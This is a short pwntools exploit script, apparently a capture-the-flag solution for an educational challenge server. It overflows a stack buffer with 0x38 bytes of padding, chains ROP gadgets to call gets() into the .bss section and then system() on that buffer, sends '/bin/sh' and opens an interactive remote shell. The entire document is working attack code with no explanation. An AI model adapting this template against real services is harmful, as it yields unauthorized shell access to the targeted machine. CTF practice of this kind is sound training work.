from pwn import *

context(arch='amd64', os='linux', log_level='debug')

bss = 0x601070
pop_rdi = 0x0000000000400733
gets_plt = 0x400530
system_plt = 0x400520

p = flat(
    'a' * 0x38,

    # gets(bss)
    pop_rdi,
    bss,
    gets_plt,

    # system(bss)
    pop_rdi,
    bss,
    system_plt,
)

#  r = remote('localhost', 1111)
r = remote('edu-ctf.csie.org', 10174)
pause()
r.sendlineafter('\n', p)
r.sendline('/bin/sh')
r.interactive()
